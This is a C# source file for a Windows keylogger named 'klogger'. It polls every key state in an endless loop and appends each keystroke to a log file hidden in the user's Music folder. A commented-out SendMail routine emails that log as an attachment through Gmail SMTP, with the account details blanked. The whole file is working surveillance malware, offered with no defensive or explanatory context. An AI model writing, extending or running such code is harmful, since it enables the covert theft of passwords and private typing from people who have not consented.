using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Runtime.InteropServices;
using System.Threading;
using System.IO;
using System.Timers;
using System.Net.Mail;
using System.Net;
namespace klogger
{
    class Program
    {
        [DllImport("user32.dll")]
        public static extern int GetAsyncKeyState(Int32 i);

        static void Main(string[] args)
        {
            string filepath = Environment.GetFolderPath(Environment.SpecialFolder.MyMusic);
            filepath = filepath + @"\LogsFolder\";
            if (!Directory.Exists(filepath))
            {
                Directory.CreateDirectory(filepath);
            }

            string path = (filepath + "LoggedKeys.text");

            if (!File.Exists(path))
            {
                using (StreamWriter sw = File.CreateText(path))
                {

                }
            }
            KeysConverter converter = new KeysConverter();
            string text = "";
            while (5 > 1)
            {
                Thread.Sleep(10);
                for (Int32 i = 0; i < 2000; i++)
                {
                    int key = GetAsyncKeyState(i);
                    if (key == 1 || key == -32767)
                    {
                        text = converter.ConvertToString(i);
                        using (StreamWriter sw = File.AppendText(path))
                        {
                            sw.WriteLine(text);
                        }
                        break;
                    }
                }
            }

        }
    /*    static void SendMail()
        {
            String Newfilepath = Environment.GetFolderPath(Environment.SpecialFolder.MyMusic);
            string Newfilepath2 = Newfilepath + @"\LogsFolder\LoggedKeys.text";
            DateTime dateTime = DateTime.Now;
            string subtext = "Loggedfiles";
            subtext += dateTime;
            SmtpClient client = new SmtpClient("smtp.gmail.com", 587);
            MailMessage LOGMESSAGE = new MailMessage();
            LOGMESSAGE.From = new MailAddress("*");
            LOGMESSAGE.To.Add("*");
            LOGMESSAGE.Subject = subtext;
            client.UseDefaultCredentials = false;
            client.EnableSsl = true;
            client.Credentials = new System.Net.NetworkCredential("*", "*");
            string newfile = File.ReadAllText(Newfilepath2);
            string attachmenttextfile = Newfilepath + @"\LogsFolder\attachmentextfile.text";
            File.WriteAllText(attachmenttextfile, newfile);
            LOGMESSAGE.Attachments.Add(new Attachment(Newfilepath2));
            LOGMESSAGE.Body = subtext;
            client.Send(LOGMESSAGE);
            LOGMESSAGE = null;
        }*/
        static void LogKeys()
        {
            string filepath = Environment.GetFolderPath(Environment.SpecialFolder.MyMusic); 
             filepath =  filepath + @"\LogsFolder\";
            if (!Directory.Exists(filepath))
            {
                Directory.CreateDirectory(filepath);
            }
            string path = (filepath + "LoggedKeys.text");
            if(!File.Exists(path))
            {
                using (StreamWriter sw = File.CreateText(path))
                {

                }
            }
            KeysConverter converter = new KeysConverter();
            string text = "";
            while(true)
            {
                Thread.Sleep(10);
                for(Int32 i=0;i<2000;i++)
                {
                    int key = GetAsyncKeyState(i);
                    if(key == 1 || key== -32767)
                    {
                        text = converter.ConvertToString(i);
                        using (StreamWriter sw = File.AppendText(path))
                        {
                            sw.WriteLine(text);
                        }
                        break;
                    }
                }
            }
        }

    }
}
